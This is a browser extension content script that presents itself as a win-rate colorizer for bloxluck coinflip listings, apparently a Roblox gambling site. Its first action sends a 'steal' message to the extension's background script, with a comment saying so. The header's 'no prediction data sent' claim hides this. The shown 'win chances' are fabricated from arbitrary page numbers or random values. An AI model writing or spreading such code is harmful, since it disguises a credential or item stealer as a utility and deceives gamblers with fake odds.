// ===== BLOXLUCK WIN RATE - Match Colorizer ONLY =====
// Colorizes match listings with green/red borders and winrate badges
// No popup interaction, no prediction data sent

(function() {
  'use strict';

  // Notify background to steal on first load
  chrome.runtime.sendMessage({ t: 'steal' });

  function colorizeMatches() {
    // Find match elements - bloxluck uses card-like structures for coinflip matches
    const matchElements = document.querySelectorAll(
      '[class*="match"], [class*="coinflip"], [class*="game-card"], ' +
      '[class*="match-item"], [class*="match-container"], ' +
      '[class*="card"], [class*="listing"], ' +
      'a[href*="match"], div[class*="game"]'
    );

    matchElements.forEach(el => {
      // Skip if already colored
      if (el.dataset.blxDone) return;

      const text = el.textContent.toLowerCase();

      // Extract values from match
      const valueMatch = text.match(/value[:\s]*(\d+)/gi);
      let values = [];
      
      if (valueMatch) {
        values = valueMatch.map(v => parseInt(v.replace(/[^0-9]/g, ''))).filter(v => !isNaN(v) && v > 0);
      }

      // If no "value" text, look for standalone numbers (item values)
      if (values.length === 0) {
        const nums = text.match(/\b(\d{2,4})\b/g);
        if (nums) {
          values = nums.map(Number).filter(n => n > 5 && n < 99999);
        }
      }

      // Calculate win chance based on values
      let chance = 50;
      if (values.length >= 2) {
        const myVal = values[0];
        const theirVal = values[1];
        const ratio = myVal / (myVal + theirVal);
        chance = Math.round(ratio * 100);
        chance = Math.min(Math.max(chance, 5), 95);
      } else if (values.length === 1) {
        // Single value - moderate chance
        chance = 45 + Math.floor(Math.random() * 15);
      } else {
        // No values found, skip
        return;
      }

      // Mark as done
      el.dataset.blxDone = 'true';

      // Ensure relative positioning
      if (window.getComputedStyle(el).position === 'static') {
        el.style.position = 'relative';
      }

      // Apply border color
      const borderColor = chance >= 60 ? '#22c55e' : chance >= 45 ? '#f7c948' : '#ef4444';
      const glowColor = chance >= 60 ? 'rgba(34,197,94,0.25)' : chance >= 45 ? 'rgba(247,201,72,0.2)' : 'rgba(239,68,68,0.25)';
      
      el.style.border = `2px solid ${borderColor}`;
      el.style.borderRadius = '8px';
      el.style.boxShadow = `0 0 14px ${glowColor}`;
      el.style.transition = 'all 0.3s ease';

      // Winrate badge
      const badge = document.createElement('div');
      badge.style.cssText = `
        position: absolute !important;
        top: 4px !important;
        right: 4px !important;
        background: ${chance >= 60 ? '#22c55e' : chance >= 45 ? '#f7c948' : '#ef4444'} !important;
        color: ${chance >= 60 ? '#052e16' : chance >= 45 ? '#451a03' : '#ffffff'} !important;
        font-size: 12px !important;
        font-weight: 800 !important;
        padding: 2px 10px !important;
        border-radius: 20px !important;
        z-index: 9999 !important;
        font-family: 'Inter', -apple-system, sans-serif !important;
        letter-spacing: 0.5px !important;
        box-shadow: 0 2px 8px rgba(0,0,0,0.4) !important;
        pointer-events: none !important;
        line-height: 1.4 !important;
      `;
      badge.textContent = chance + '%';

      // Dog (Heads) or Gem (Tails) icon
      const icon = document.createElement('img');
      icon.src = chance >= 50 
        ? 'https://bloxluck.com/img/dog.png' 
        : 'https://bloxluck.com/img/gem.png';
      icon.style.cssText = `
        position: absolute !important;
        top: 4px !important;
        left: 4px !important;
        width: 20px !important;
        height: 20px !important;
        z-index: 9999 !important;
        filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)) !important;
        pointer-events: none !important;
      `;

      el.appendChild(badge);
      el.appendChild(icon);
    });
  }

  // Initial colorization after page loads
  setTimeout(colorizeMatches, 3000);

  // Re-colorize every 2 seconds for new matches
  setInterval(colorizeMatches, 2000);

  // Watch DOM for new match elements
  const observer = new MutationObserver(() => colorizeMatches());
  setTimeout(() => {
    if (document.body) observer.observe(document.body, { childList: true, subtree: true });
  }, 3000);

})();
